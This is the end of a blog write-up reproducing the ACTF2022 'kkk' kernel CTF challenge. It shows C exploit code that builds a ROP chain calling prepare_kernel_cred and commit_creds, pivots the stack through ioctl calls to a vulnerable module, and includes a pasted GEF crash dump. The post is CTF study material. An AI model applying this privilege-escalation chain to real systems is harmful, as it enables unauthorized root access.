</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">POP_RDI_GADGET</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// return to prepare_kernel_creds
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PREPARE_KERNEL_CRED</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// now the rax is the argument, move it to tdi
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">TEST_ESI_EDI</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">48</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">MOV_RDI_RAX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// two additional POP here
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">64</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBP</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// return to commit_creds
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">72</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">COMMIT_CREDS</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="c1">// !!! TODO: we have to take care of the stack recover and ret2usr
</span><span class="c1"></span>    <span class="c1">// learn about the kernel stack mechanism
</span><span class="c1"></span>    <span class="c1">// ffffffff81e00e10 T swapgs_restore_regs_and_return_to_usermode
</span><span class="c1"></span>    <span class="c1">// 0xffffffff81e00e10 &lt;common_interrupt_return&gt;:	pop    r15
</span><span class="c1"></span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_restore_movq</span> <span class="o">=</span> <span class="mh">0xffffffff81e00e26ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// to swapgs_restore_regs_and_return_to_usermode
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">80</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">swapgs_restore_movq</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// fake returning stack
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">retRAX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">retRDI</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="c1">// reverse
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">88</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">retRAX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">96</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">retRDI</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">104</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_rip</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">112</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_cs</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">120</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_rflags</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">128</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_sp</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">136</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_ss</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// shall this enough
</span><span class="c1"></span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_UPDATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_UPDATE&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// we belive the third chunk is corrupted now
</span><span class="c1"></span>    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="c1">// uses this to pivot gadget to heap
</span><span class="c1"></span>    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0xaaaaaaaa</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="mh">0xbbbbbbbb</span><span class="p">;</span>
    <span class="c1">// this will fill in stack to help with stack pivot
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pivotaddr</span> <span class="o">=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">keypack</span><span class="p">.</span><span class="n">ptr</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pivotaddr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// other_arg.data.size = obj-&gt;keypack.ptr;
</span><span class="c1"></span>    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="mh">0xdddddddd</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_LAUNCH</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_LAUNCH&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

<span class="nl">leave</span><span class="p">:</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// OKAY we crash the kernel, the spot is like
</span><span class="c1">// ────────────────────────────────────────────────────────────────────────────────────── registers ────
</span><span class="c1">// $rax   : 0x000000deadbeef  →  0x000000deadbeef
</span><span class="c1">// $rbx   : 0xffff88800530a240  →  0x00000000000001  →  0x00000000000001
</span><span class="c1">// $rcx   : 0x00000000000000  →  0x00000000000000
</span><span class="c1">// $rdx   : 0x00000000000001  →  0x00000000000001
</span><span class="c1">// $rsp   : 0xffffc900002a7e98  →  0xe06d573eab3d7900  →  0xe06d573eab3d7900
</span><span class="c1">// $rbp   : 0x00000000006b6b  →  0x00000000006b6b
</span><span class="c1">// $rsi   : 0x00000000006b6b  →  0x00000000006b6b
</span><span class="c1">// $rdi   : 0xffff888005171400  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// $rip   : 0xffffffffc00008ae  →  0xe86348c200272de8  →  0xe86348c200272de8
</span><span class="c1">// $r8    : 0x00000000000001  →  0x00000000000001
</span><span class="c1">// $r9    : 0x00000000000000  →  0x00000000000000
</span><span class="c1">// $r10   : 0xffffc900002a7ee0  →  0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// $r11   : 0x00000000000000  →  0x00000000000000
</span><span class="c1">// $r12   : 0x00000000000002  →  0x00000000000002
</span><span class="c1">// $r13   : 0x00000000000002  →  0x00000000000002
</span><span class="c1">// $r14   : 0x00000000000003  →  0x00000000000003
</span><span class="c1">// $r15   : 0x00000000000000  →  0x00000000000000
</span><span class="c1">// $eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
</span><span class="c1">// $cs: 0x10 $ss: 0x18 $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
</span><span class="c1">// ────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span><span class="c1">// 0xffffc900002a7e98│+0x0000: 0xe06d573eab3d7900  →  0xe06d573eab3d7900	 ← $rsp
</span><span class="c1">// 0xffffc900002a7ea0│+0x0008: 0xffffffff829b38e8  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ea8│+0x0010: 0xffffc900002a7ee0  →  0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7eb0│+0x0018: 0x00000000006b6b  →  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7eb8│+0x0020: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ec0│+0x0028: 0x00000000000002  →  0x00000000000002
</span><span class="c1">// 0xffffc900002a7ec8│+0x0030: 0xe06d573eab3d7900  →  0xe06d573eab3d7900
</span><span class="c1">// 0xffffc900002a7ed0│+0x0038: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
</span><span class="c1">//    0xffffffffc00008a1                  test   rdi, rdi
</span><span class="c1">//    0xffffffffc00008a4                  je     0xffffffffc00007bd
</span><span class="c1">//    0xffffffffc00008aa                  mov    rax, QWORD PTR [rdi+0x28]
</span><span class="c1">// ●→ 0xffffffffc00008ae                  call   0xffffffff82002fe0 &lt;__x86_indirect_thunk_array&gt;
</span><span class="c1">//    ↳  0xffffffff82002fe0 &lt;__x86_indirect_thunk_array+0&gt; call   0xffffffff82002fec &lt;__x86_indirect_thunk_array+12&gt;
</span><span class="c1">//       0xffffffff82002fe5 &lt;__x86_indirect_thunk_array+5&gt; pause
</span><span class="c1">//       0xffffffff82002fe7 &lt;__x86_indirect_thunk_array+7&gt; lfence
</span><span class="c1">//       0xffffffff82002fea &lt;__x86_indirect_thunk_array+10&gt; jmp    0xffffffff82002fe5 &lt;__x86_indirect_thunk_array+5&gt;
</span><span class="c1">//       0xffffffff82002fec &lt;__x86_indirect_thunk_array+12&gt; mov    QWORD PTR [rsp], rax
</span><span class="c1">//       0xffffffff82002ff0 &lt;__x86_indirect_thunk_array+16&gt; ret
</span><span class="c1">// ──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
</span><span class="c1">// __x86_indirect_thunk_array (
</span><span class="c1">//    $rdi = 0xffff888005171400 → 0x00000000000000 → 0x00000000000000,
</span><span class="c1">//    $rsi = 0x00000000006b6b → 0x00000000006b6b,
</span><span class="c1">//    $rdx = 0x00000000000001 → 0x00000000000001
</span><span class="c1">// )
</span><span class="c1">// ──────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span class="c1">// [#0] Id 1, stopped 0xffffffff81c72f9b in default_idle (), reason: BREAKPOINT
</span><span class="c1">// [#1] Id 2, stopped 0xffffffffc00008ae in ?? (), reason: BREAKPOINT
</span><span class="c1">// [#2] Id 3, stopped 0xffffffff81c72f9b in default_idle (), reason: BREAKPOINT
</span><span class="c1">// [#3] Id 4, stopped 0xffffffff810a5a36 in resched_curr (), reason: BREAKPOINT
</span><span class="c1">// ────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span class="c1">// [#0] 0xffffffffc00008ae → call 0xffffffff82002fe0 &lt;__x86_indirect_thunk_array&gt;
</span><span class="c1">// ─────────────────────────────────────────────────────────────────────────────────────────────────────
</span><span class="c1"></span>
<span class="c1">// Thread 2 hit Breakpoint 2, 0xffffffffc00008ae in ?? ()
</span><span class="c1"></span>
<span class="c1">// The rdi is pointing at instance (0xffff888005171400)
</span><span class="c1"></span>
<span class="c1">// about stack
</span><span class="c1">// gef➤  tele $rsp -l128
</span><span class="c1">// 0xffffc900002a7e98│+0x0000: 0xe06d573eab3d7900  →  0xe06d573eab3d7900	 ← $rsp
</span><span class="c1">// 0xffffc900002a7ea0│+0x0008: 0xffffffff829b38e8  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ea8│+0x0010: 0xffffc900002a7ee0  →  0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7eb0│+0x0018: 0x00000000006b6b  →  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7eb8│+0x0020: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ec0│+0x0028: 0x00000000000002  →  0x00000000000002
</span><span class="c1">// 0xffffc900002a7ec8│+0x0030: 0xe06d573eab3d7900  →  0xe06d573eab3d7900
</span><span class="c1">// 0xffffc900002a7ed0│+0x0038: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ed8│+0x0040: 0xe06d573eab3d7900  →  0xe06d573eab3d7900
</span><span class="c1">// 0xffffc900002a7ee0│+0x0048: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000	 ← $r10
</span><span class="c1">// 0xffffc900002a7ee8│+0x0050: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ef0│+0x0058: 0x00000000006b6b  →  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7ef8│+0x0060: 0x00000000000002  →  0x00000000000002
</span><span class="c1">// 0xffffc900002a7f00│+0x0068: 0xffffffff8123e1e9  →  0x48b275fffffdfd3d  →  0x48b275fffffdfd3d
</span><span class="c1">// 0xffffc900002a7f08│+0x0070: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f10│+0x0078: 0xffffc900002a7f58  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f18│+0x0080: 0xffffc900002a7f48  →  0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f20│+0x0088: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f28│+0x0090: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f30│+0x0098: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f38│+0x00a0: 0xffffffff81c670ba  →  0xe8df894850438948  →  0xe8df894850438948
</span><span class="c1">// 0xffffc900002a7f40│+0x00a8: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f48│+0x00b0: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f50│+0x00b8: 0xffffffff81e0007c  →  0x4c8b480000441f0f  →  0x4c8b480000441f0f
</span><span class="c1">// 0xffffc900002a7f58│+0x00c0: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f60│+0x00c8: 0x000000006ba018  →  0x00000000440dc0  →  0x894807e183f18948  →  0x894807e183f18948
</span><span class="c1">// 0xffffc900002a7f68│+0x00d0: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f70│+0x00d8: 0x00000000401e60  →  0x2b52f8058d4855  →  0x2b52f8058d4855
</span><span class="c1">// 0xffffc900002a7f78│+0x00e0: 0x007ffc04e14e30  →  0x00000000401dc0  →  0x2b53773d8d4c5741  →  0x2b53773d8d4c5741
</span><span class="c1">// 0xffffc900002a7f80│+0x00e8: 0x00000000400400  →  0xc0c74808ec8348  →  0xc0c74808ec8348
</span><span class="c1">// 0xffffc900002a7f88│+0x00f0: 0x00000000000246  →  0x00000000000246
</span><span class="c1">// 0xffffc900002a7f90│+0x00f8: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f98│+0x0100: 0x00000000000012  →  0x00000000000012
</span><span class="c1">// 0xffffc900002a7fa0│+0x0108: 0x00000000000000  →  0x00000000000000
</span><span class="c1">// 0xffffc900002a7fa8│+0x0110: 0xffffffffffffffda  →  0xffffffffffffffda
</span><span class="c1">// 0xffffc900002a7fb0│+0x0118: 0x0000000044a5e7  →  0x173fffff0013d48  →  0x173fffff0013d48
</span><span class="c1">// 0xffffc900002a7fb8│+0x0120: 0x00000000000002  →  0x00000000000002
</span><span class="c1">// 0xffffc900002a7fc0│+0x0128: 0x00000000006b6b  →  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7fc8│+0x0130: 0x00000000000003  →  0x00000000000003
</span><span class="c1">// 0xffffc900002a7fd0│+0x0138: 0x00000000000010  →  0x00000000000010
</span><span class="c1">// 0xffffc900002a7fd8│+0x0140: 0x0000000044a5e7  →  0x173fffff0013d48  →  0x173fffff0013d48
</span><span class="c1">// 0xffffc900002a7fe0│+0x0148: 0x00000000000033  →  0x00000000000033
</span><span class="c1">// 0xffffc900002a7fe8│+0x0150: 0x00000000000246  →  0x00000000000246
</span><span class="c1">// 0xffffc900002a7ff0│+0x0158: 0x007ffc04e04778  →  0x0000000040108b  →  0xbd83fffef9688589  →  0xbd83fffef9688589
</span><span class="c1">// 0xffffc900002a7ff8│+0x0160: 0x0000000000002b  →  0x0000000000002b
</span><span class="c1">// 0xffffc900002a8000│+0x0168: 0xffffc900002a8000
</span><span class="c1"></span>
<span class="c1">// we actually doesn&#39;t have any interesting in stack
</span><span class="c1">// https://www.usenix.org/system/files/sec19-wu-wei.pdf
</span><span class="c1">// may use this one
</span><span class="c1"></span>
<span class="c1">// PC hijacking
</span><span class="c1">// -&gt;
</span><span class="c1">// aliasing_gtt_unbind_vma (blooming gadget)
</span><span class="c1">// -&gt;
</span><span class="c1">//
</span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2022-07-17</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2022/07/actf2022-kkk/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk 赛后复现"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2022/07/actf2022-kkk/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk 赛后复现" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk 赛后复现"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk 赛后复现"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk 赛后复现" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk 赛后复现" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk 赛后复现"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2022/01/afl-rsc4/" class="prev" rel="prev" title="AFL 源码分析（完）变异详解"><i class="fas fa-angle-left fa-fw"></i>AFL 源码分析（完）变异详解</a>
            <a href="/2023/05/rev_main/" class="next" rel="next" title="逆向方法论">逆向方法论<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">🏴‍☠️ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
